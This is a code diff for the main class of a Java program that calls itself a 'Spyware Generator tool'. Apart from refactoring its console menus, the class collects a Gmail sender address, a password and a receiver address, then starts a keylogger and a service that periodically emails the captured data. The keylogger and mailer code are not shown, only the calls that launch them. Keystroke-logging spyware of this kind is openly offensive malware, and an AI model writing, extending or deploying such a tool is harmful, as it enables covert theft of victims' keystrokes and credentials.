@@ -2,24 +2,18 @@ package com.houarizegai.spygen;
 
 import com.houarizegai.spygen.global.Settings;
 import com.houarizegai.spygen.global.Utils;
+
+import static com.houarizegai.spygen.global.Color.*;
+
 import com.houarizegai.spygen.keylogger.Keylogger;
 import com.houarizegai.spygen.mail.SenderService;
+import com.houarizegai.spygen.validators.RegexValidator;
 
 import java.util.Scanner;
-import java.util.concurrent.TimeUnit;
 
 public class SpyGen {
-    private static final String RESET = "\u001B[0;1m";
-    private static final String BLACK = "\u001B[30;1m";
-    private static final String RED = "\u001B[31;1m";
-    private static final String GREEN = "\u001B[32;1m";
-    private static final String YELLOW = "\u001B[33;1m";
-    private static final String BLUE = "\u001B[34;1m";
-    private static final String PURPLE = "\u001B[35;1m";
-    private static final String CYAN = "\u001B[36;1m";
-    private static final String WHITE = "\u001B[37;1m";
 
-    private static Scanner mScanner = new Scanner(System.in);
+    private static final Scanner mScanner = new Scanner(System.in);
 
     public static void main(String[] args) {
         checkSupportedOS();
@@ -34,18 +28,20 @@ public class SpyGen {
     }
 
     private static void showMenu() {
-        System.out.println(RED + "   SpyGen [Spyware Generator tool] " + GREEN + "  Version: 0.1   \n"
-                + BLUE + "                    Written by Houari ZEGAI                        \n"
-                + WHITE + "                                                                  \n"
-                + YELLOW + "                      ** DISCLAIMER **                            \n"
-                + WHITE + " THIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.\n"
-                + WHITE + " YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE  \n"
-                + WHITE + " RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO         \n"
-                + WHITE + " LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE       \n"
-                + WHITE + " CAUSED BY THIS PROGRAM.                                          \n"
-                + WHITE + "                                                                  \n"
-                + WHITE + " Close this window if you wish to exit. Otherwise,                \n"
-                + WHITE + " press [ENTER] key to continue..."
+        System.out.printf("""
+                %s   SpyGen [Spyware Generator tool] %s  Version: 0.1   
+                %s                    Written by Houari ZEGAI                        
+                %s                                                                  
+                %s                      ** DISCLAIMER **                           
+                %s THIS SOFTWARE IS PROVIDED \"AS IS\" WITHOUT WARRANTY OF ANY KIND.
+                %s YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE  
+                %s RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO         
+                %s LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE       
+                %s CAUSED BY THIS PROGRAM.                                          
+                %s                                                                  
+                %s Close this window if you wish to exit. Otherwise,                
+                %s press [ENTER] key to continue...
+                """, RED, GREEN, BLUE, WHITE, YELLOW, WHITE, WHITE, WHITE, WHITE, WHITE, WHITE, WHITE, WHITE
         );
 
         mScanner.nextLine();
@@ -53,7 +49,7 @@ public class SpyGen {
     }
 
     private static void showFillInfo() {
-        clearScreen();
+        Utils.clearScreen();
         System.out.println(""
                 + RED + "          +---------------------------------------------------+\n"
                 + RED + "    (__)  | " + YELLOW + "WARNING: Use Gmail account only!                  " + RED + "|\n"
@@ -64,19 +60,18 @@ public class SpyGen {
 
         System.out.println(YELLOW + "NOTE:" + WHITE + " Allow access to less secure apps on your gmail account.");
         System.out.println(WHITE + " -> https://www.google.com/settings/security/lesssecureapps");
-
         System.out.println(YELLOW + " GENERATE SPYWARE\n" + YELLOW + " --------------------------------------------");
 
         System.out.print(YELLOW + "[*] Enter your E-mail: " + WHITE);
         Settings.senderMail = mScanner.nextLine();
-        while (!Utils.isValidMail(Settings.senderMail)) {
+        while (!RegexValidator.isEmail(Settings.senderMail)) {
             System.out.print(YELLOW + "[*] Enter your E-mail: " + WHITE);
             Settings.senderMail = mScanner.nextLine();
         }
 
         System.out.print(YELLOW + "[*] Enter receiver E-mail: " + WHITE);
         Settings.receiverMail = mScanner.nextLine();
-        while (!Utils.isValidMail(Settings.receiverMail)) {
+        while (!RegexValidator.isEmail(Settings.receiverMail)) {
             System.out.print(YELLOW + "[*] Enter receiver E-mail: " + WHITE);
             Settings.receiverMail = mScanner.nextLine();
         }
@@ -96,46 +91,34 @@ public class SpyGen {
         }
         Settings.periodSendingSeconds = Integer.parseInt(periodSending);
 
-        System.out.println("\n"
-                + GREEN + " +------------------------------------------+\n"
-                + GREEN + "   Email: " + WHITE + Settings.senderMail + "\n"
-                + GREEN + "   Password: " + WHITE + Settings.senderPassword + "\n"
-                + GREEN + "   Receiver mail: " + WHITE + Settings.receiverMail+ "\n"
-                + GREEN + "   Period sending data [per second]: " + WHITE + Settings.periodSendingSeconds + "\n"
-                + GREEN + " +------------------------------------------+"
-        );
-
+        System.out.printf("""
+                %s +------------------------------------------+
+                %s   Email: %s %s
+                %s   Password: %s %s
+                %s   Receiver mail: %s %s
+                %s   Period sending data [per second]: %s %s
+                %s +------------------------------------------+
+                """, GREEN, GREEN, WHITE, Settings.senderMail, GREEN, WHITE, Settings.senderPassword, GREEN, WHITE,
+                Settings.receiverMail, GREEN, WHITE, Settings.periodSendingSeconds, GREEN
+                );
 
         String optConfirm;
         do {
             System.out.print(YELLOW + "\n [*] The information above is correct? (y/n): " + WHITE);
             optConfirm = mScanner.nextLine();
-        } while(optConfirm.trim().isEmpty());
+        } while (optConfirm.trim().isEmpty());
 
-        if(optConfirm.trim().equalsIgnoreCase("y")) {
-            // start the sypware
+        if (optConfirm.trim().equalsIgnoreCase("y")) {
+            // run
             Keylogger.startKeylogger();
             new SenderService();
-        } else if(optConfirm.trim().equalsIgnoreCase("n")) {
-            waitSeconds(1);
+        } else if (optConfirm.trim().equalsIgnoreCase("n")) {
+            Utils.waitSeconds(1);
             showFillInfo();
         } else {
             System.out.println("[*] Invalid option!");
-            waitSeconds(1);
+            Utils.waitSeconds(1);
             showFillInfo();
         }
     }
-
-    private static void waitSeconds(int time) {
-        try {
-            TimeUnit.SECONDS.sleep(time);
-        } catch(InterruptedException ie) {
-            ie.printStackTrace();
-        }
-    }
-
-    private static void clearScreen() {
-        for (int i = 0; i < 10; ++i) System.out.println();
-    }
-
 }
